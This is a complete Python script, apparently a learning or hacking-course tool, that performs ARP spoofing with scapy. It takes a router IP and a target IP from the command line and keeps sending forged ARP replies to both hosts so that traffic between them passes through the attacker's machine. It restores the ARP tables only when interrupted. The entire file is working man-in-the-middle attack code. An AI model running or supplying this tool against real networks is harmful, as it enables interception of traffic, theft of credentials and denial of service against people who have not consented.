#!/usr/bin/env python

import optparse
import scapy.all as scapy
import time


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-s", "--source_ip", dest="source", help="Router_ip or Source_ip")
    parser.add_option("-t", "--target", dest="target", help="Target_ip")
    (options, arguments) = parser.parse_args()

    if not options.source:
        parser.error("Please input Router/Source IP, use --help for more info.")
    elif not options.target:
        parser.error("Please input Target IP, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=False)


ip_address = get_arguments()
send_packet_count=0

try:
    while True:
        spoof(ip_address.target, ip_address.source)
        spoof(ip_address.source, ip_address.target)
        send_packet_count += 2
        print("\r[+] Packets send: " + str(send_packet_count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C .....Resetting ARP tables...Please wait.\n")
    restore(ip_address.target, ip_address.source)
    restore(ip_address.source, ip_address.target)
